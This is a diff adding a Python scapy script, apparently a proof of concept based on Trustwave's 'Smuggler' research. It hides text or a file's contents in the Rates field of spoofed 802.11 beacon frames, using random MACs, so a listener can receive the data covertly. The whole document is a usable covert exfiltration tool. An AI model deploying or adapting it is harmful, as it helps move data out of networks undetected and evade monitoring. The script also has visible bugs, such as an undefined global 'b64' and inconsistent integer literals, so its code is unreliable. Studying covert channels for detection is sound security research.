@@ -1,0 +1,143 @@
+#!/usr/bin/python
+# -- coding: utf-8 --
+# Code based on code from: https://www.trustwave.com/Resources/SpiderLabs-Blog/Smuggler---An-interactive-802-11-wireless-shell-without-the-need-for-authentication-or-association/
+# wireless information elements sender PoC – Tom Neaves <tneaves@trustwave.com>
+# TODO: Add option to use Extended Rates vs Rates
+# TODO: Add option to encode data in Rates via pattern
+# TODO: Add option to sniff packets and use SSID and MACs from something existing
+# TODO: implement function to split data into x sized chunks
+
+
+__author__ = 'Ben Smith'
+
+import logging
+import sys
+import argparse
+import hashlib
+import time
+import base64
+from scapy.all import *
+
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+#set hash table for weak encoding scheme
+EncodeRates = {}
+EncodeRates["1MB/2MB/5.5MB/6MB"] = 0001
+EncodeRates["2MB/5.5MB/6MB"] = 0010
+EncodeRates["1MB/5.5MB/6MB"] = 0011
+EncodeRates["1MB/2MB/6MB"] = 0100
+EncodeRates["1MB/2MB/5.5MB"] = 0101
+EncodeRates["5.5MB/6MB"] = 0110
+EncodeRates["1MB/6MB"] = 0111
+EncodeRates["1MB/2MB"] = 1000
+EncodeRates["1MB/5.5MB"] =1001
+EncodeRates["2MB/5.5MB"] = 1010
+EncodeRates["2MB/6MB"] = 1011
+EncodeRates["1MB"] = 1100
+EncodeRates["2MB"] = 1101
+EncodeRates["5.5MB"] = 1110
+EncodeRates["6MB"] = 1111
+
+# Reminder about 802.11 types:
+# Type 0: Management
+#   Subtype 0: Association Req
+#   Subtype 4: Probe
+#   Subtype 5: Probe Response
+#   Subtype 8: Beacon
+#   Subtype 11: Authentication
+#   Subtype 12: Deauth
+# Type 1: Control
+#   Subtype 27: Request-To-Send
+#   Subtype 28: Clear-To-Send
+# Type 2: Data
+#   Subtype 32: Data
+#   Subtype 40: QoS
+
+def main():
+
+    # set defaults
+    inputText = ""
+    inputFile = ""
+
+    # set command line options
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--text", dest="text", help="text to send via covert channel")
+    parser.add_argument("-f", "--file", dest="file", help="path of file for data to send")
+    parser.add_argument("-s", "--ssid", dest="ssid", help="SSID to use", default="CovertRates")
+    parser.add_argument("-i", "--iface", dest="iface", help="monitor mode wifi interface to broadcast on", default="mon1")
+    parser.add_argument("-b", "--base64", dest="base64", help="encode covert data in base64", action='store_true')
+    parser.add_argument("-d", "--datasize", dest="datasize", help="max size to split data into per packet", default=255, type=int, choices=range(1,255), metavar="1-255")
+    args = parser.parse_args()
+    if args.text:
+        inputText = args.text
+    if args.file:
+        inputFile = args.file
+    if not (args.file or args.text):
+            inputText = "Hey there covert listener!"
+    ssid = args.ssid
+    conf.iface = args.iface
+    dataSize = args.datasize
+    b64 = args.base64
+
+    # determine type of data to work with
+    if inputText:
+        data = inputText
+    elif inputFile:
+        f = open(inputFile,'r')
+        data = f.read()
+    if args.base64:
+        data = base64.b64encode(data)
+
+    sendLength = len(data)
+    md5Hash = GenerateChecksum(data)
+    ReadyToSendDefault(md5Hash, sendLength, ssid)
+    time.sleep(1) # give listener time to get ready
+
+    # break data into chunks each packet can handle
+    if(sendLength > dataSize):
+        chop = ChopData(data, dataSize)
+        for piece in chop:
+            SendRates(piece, ssid)
+    else:
+        SendRates(data, ssid)
+
+
+def SendRates(rates, ssid):
+    #build packet
+    if b64: rates = base64.b64encode(rates)
+    frame=RadioTap()/\
+        Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=RandMAC(),addr3=RandMAC())/\
+        Dot11Beacon(cap="ESS")/\
+        Dot11Elt(ID="SSID",len=len(ssid),info=ssid)/\
+        Dot11Elt(ID="Rates",info=rates)/\
+        Dot11Elt(ID="DSset",info="\x03")/\
+        Dot11Elt(ID="TIM",info="\x00\x01\x00\x00")
+    sendp(frame, verbose=1)
+
+def ReadyToSendDefault(md5Hash, sendLength, ssid):
+    # send a beacon frame with an encoded message indicating the listener should begin paying attention
+    # TODO: Get SSID and addr2 or addr3 or other info from a sampling of packets in the air.
+    ratesPayload = md5Hash.__str__() + "." + sendLength.__str__() + "." + ssid
+    if b64: ratesPayload = base64.b64encode(ratesPayload)
+    ratesPayload = "RTS" + "." + ratesPayload
+    frame=RadioTap()/\
+        Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=RandMAC(),addr3=RandMAC())/\
+        Dot11Beacon(cap="ESS")/\
+        Dot11Elt(ID="SSID",len=len(ssid),info=ssid)/\
+        Dot11Elt(ID="Rates",info=ratesPayload)/\
+        Dot11Elt(ID="DSset",info="\x03")/\
+        Dot11Elt(ID="TIM",info="\x00\x01\x00\x00")
+    sendp(frame, verbose=1)
+
+def GenerateChecksum(data):
+    # generate a checksum so listener can validate data sent
+    m = hashlib.md5()
+    m.update(data)
+    return m.hexdigest()
+
+def ChopData(data, size):
+    # chops a string into an array of size sized blocks
+    return [data[i:i+size] for i in range(0, len(data), size)]
+
+if __name__ == "__main__":
+    main()
